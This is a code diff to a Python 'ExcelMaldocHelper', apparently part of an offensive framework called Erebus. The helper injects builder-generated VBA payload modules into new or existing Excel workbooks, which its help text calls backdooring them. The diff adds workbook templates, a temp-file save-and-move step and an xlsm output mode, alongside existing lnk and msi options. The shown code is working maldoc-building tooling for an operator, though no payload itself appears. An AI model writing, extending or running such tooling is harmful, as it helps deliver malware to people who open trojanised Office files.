@@ -865,6 +865,7 @@ def _inject_via_com(
     fmt: str,
     module_name: str = "ErebusPayload",
     overwrite_module: bool = True,
+    template_path: Optional[str] = None,
 ) -> Tuple[bool, str]:
     xl_format = {
         "xlsm": _XL_FORMAT_XLSM,
@@ -893,8 +894,14 @@ def _inject_via_com(
             wb = excel.Workbooks.Open(str(src))
             logger.info(f"Opened source workbook: {src.name}")
         else:
-            wb = excel.Workbooks.Add()
-            logger.info("Created new blank workbook")
+            # Use template if available, otherwise create blank workbook
+            tpl = _resolve_template(output_path, template_path) if not source_excel else None
+            if tpl and tpl.exists():
+                wb = excel.Workbooks.Open(str(tpl.resolve()))
+                logger.info(f"Opened template workbook: {tpl.name}")
+            else:
+                wb = excel.Workbooks.Add()
+                logger.info("Created new blank workbook")
 
         try:
             vba_project = wb.VBProject
@@ -922,13 +929,28 @@ def _inject_via_com(
         new_mod.CodeModule.AddFromString(vba_code)
         logger.info(f"Injected VBA module '{module_name}' ({len(vba_code)} chars)")
 
-        wb.SaveAs(str(out), FileFormat=xl_format)
-        logger.info(f"Saved workbook as {out.name} (format {xl_format})")
+        # SaveAs fails if the destination already exists (COM does not overwrite).
+        # Save to a clean temp path first, then move to the final destination.
+        tmp_fd, tmp_path_str = tempfile.mkstemp(suffix=correct_ext)
+        os.close(tmp_fd)
+        tmp_path = Path(tmp_path_str)
+
+        try:
+            wb.SaveAs(str(tmp_path), FileFormat=xl_format)
+            logger.info(f"Saved workbook to temp: {tmp_path.name} (format {xl_format})")
+        except Exception as save_exc:
+            tmp_path.unlink(missing_ok=True)
+            raise save_exc
 
         wb.Close(SaveChanges=False)
         wb = None
         excel.Quit()
         excel = None
+
+        # Move temp file to final destination
+        if out.exists():
+            out.unlink()
+        shutil.move(str(tmp_path), str(out))
 
         if not out.exists():
             return False, "Excel saved cleanly but output file not found on disk"
@@ -953,11 +975,58 @@ def _inject_via_com(
             pass
 
 
+def _resolve_template(output_path: str, explicit_template: Optional[str] = None) -> Optional[Path]:
+    """
+    Resolve the XLSX/XLSM template to use when creating a new workbook.
+
+    The builder ships the template into the payload directory alongside the
+    .bas file and build_maldoc.bat.  When the operator runs the helper on
+    a Windows host the template is expected to be in the working directory
+    (the payload directory).
+
+    Parameters
+    ----------
+    output_path : str
+        Target output path whose extension selects the template variant.
+    explicit_template : str, optional
+        Operator-supplied template path (``--template``).  Takes priority.
+
+    Returns
+    -------
+    Path or None
+    """
+    if explicit_template:
+        p = Path(explicit_template)
+        if p.exists():
+            return p
+
+    ext = Path(output_path).suffix.lower()
+    template_name = "template.xlsm" if ext in (".xlsm", ".xlam") else "template.xlsx"
+
+    candidates = [
+        # 1. Current working directory (payload dir on operator host)
+        Path.cwd() / template_name,
+        # 2. Same directory as the output file
+        Path(output_path).resolve().parent / template_name,
+        # 3. Next to this script (for Docker / dev environments)
+        Path(__file__).resolve().parent / template_name,
+        # 4. agent_code/templates/ (Docker container layout)
+        Path(__file__).resolve().parent.parent / "templates" / template_name,
+    ]
+
+    for c in candidates:
+        if c.exists():
+            return c
+
+    return None
+
+
 def _inject_via_zip(
     vba_code: str,
     output_path: str,
     source_excel: Optional[str],
     fmt: str,
+    template_path: Optional[str] = None,
 ) -> Tuple[bool, str]:
     """ZIP-based VBA injection fallback (Linux / no Excel)."""
     try:
@@ -975,10 +1044,13 @@ def _inject_via_zip(
                 output_path=str(out),
             )
         else:
+            # Resolve template for new workbook creation
+            tpl = _resolve_template(output_path, template_path)
             result_path = plugin.generate_excel_payload(
                 payload_path=str(out.parent),
                 vba_payload=vba_code,
                 output_path=str(out),
+                template_path=tpl,
             )
 
         if result_path and Path(result_path).exists():
@@ -1007,6 +1079,7 @@ class ExcelMaldocHelper:
         source_excel: Optional[str] = None,
         fmt: str = "xlsm",
         module_name: str = "ErebusPayload",
+        template_path: Optional[str] = None,
     ) -> Tuple[bool, str]:
         if self._use_com:
             logger.info("Using COM-based Excel injection")
@@ -1016,6 +1089,7 @@ class ExcelMaldocHelper:
                 source_excel=source_excel,
                 fmt=fmt,
                 module_name=module_name,
+                template_path=template_path,
             )
         else:
             logger.info("Using ZIP-based Excel injection (fallback)")
@@ -1024,6 +1098,7 @@ class ExcelMaldocHelper:
                 output_path=output_path,
                 source_excel=source_excel,
                 fmt=fmt,
+                template_path=template_path,
             )
 
     def from_bas_file(
@@ -1033,6 +1108,7 @@ class ExcelMaldocHelper:
         source_excel: Optional[str] = None,
         fmt: str = "xlsm",
         module_name: str = "ErebusPayload",
+        template_path: Optional[str] = None,
     ) -> Tuple[bool, str]:
         bas = Path(bas_path)
         if not bas.exists():
@@ -1049,6 +1125,7 @@ class ExcelMaldocHelper:
             source_excel=source_excel,
             fmt=fmt,
             module_name=module_name,
+            template_path=template_path,
         )
 
 
@@ -1061,8 +1138,8 @@ def main():
 
     parser.add_argument(
         'command',
-        choices=['xll', 'dll', 'verify', 'excel', 'xlsx', 'xlam', 'lnk', 'msi'],
-        help='Build/create command to execute (xll/dll/verify for compilation, excel/xlsx/xlam/lnk/msi for creation)'
+        choices=['xll', 'dll', 'verify', 'excel', 'xlsx', 'xlsm', 'xlam', 'lnk', 'msi'],
+        help='Build/create command to execute (xll/dll/verify for compilation, excel/xlsx/xlsm/xlam/lnk/msi for creation)'
     )
 
     # Common arguments
@@ -1136,18 +1213,23 @@ def main():
     # Arguments for xlsx/xlam maldoc injection (COM-based, Windows host)
     parser.add_argument(
         '--bas-file',
-        help='Path to .bas VBA module file generated by the builder (required for xlsx/xlam)'
+        help='Path to .bas VBA module file generated by the builder (required for xlsx/xlsm/xlam)'
     )
 
     parser.add_argument(
         '--source-excel',
-        help='Existing Excel file to backdoor (xlsx/xlam). Creates a blank workbook if omitted.'
+        help='Existing Excel file to backdoor (xlsx/xlsm/xlam). Creates a blank workbook if omitted.'
     )
 
     parser.add_argument(
         '--module-name',
         default='ErebusPayload',
         help='VBA module name to create inside the workbook (default: ErebusPayload)'
+    )
+
+    parser.add_argument(
+        '--template',
+        help='Path to XLSX/XLSM template file for new workbook creation. Auto-resolved from agent_code/templates/ if omitted.'
     )
 
     parser.add_argument(
@@ -1253,7 +1335,7 @@ def main():
     elif args.command == 'excel':
         # For excel: --source is input excel or VBA code, --title is workbook title
         pass  # --output is always required
-    elif args.command in ('xlsx', 'xlam'):
+    elif args.command in ('xlsx', 'xlsm', 'xlam'):
         if not args.bas_file:
             parser.error(f"--bas-file is required for {args.command} command")
     elif args.command == 'lnk':
@@ -1334,7 +1416,7 @@ def main():
                 logger.error(f"Excel creation failed: {e}")
                 success = False
 
-        elif args.command in ('xlsx', 'xlam'):
+        elif args.command in ('xlsx', 'xlsm', 'xlam'):
             try:
                 helper = ExcelMaldocHelper(prefer_com=not args.no_com)
                 ok, msg = helper.from_bas_file(
@@ -1343,6 +1425,7 @@ def main():
                     source_excel=args.source_excel,
                     fmt=args.command,
                     module_name=args.module_name,
+                    template_path=getattr(args, 'template', None),
                 )
                 if not ok:
                     logger.error(f"Maldoc injection failed: {msg}")
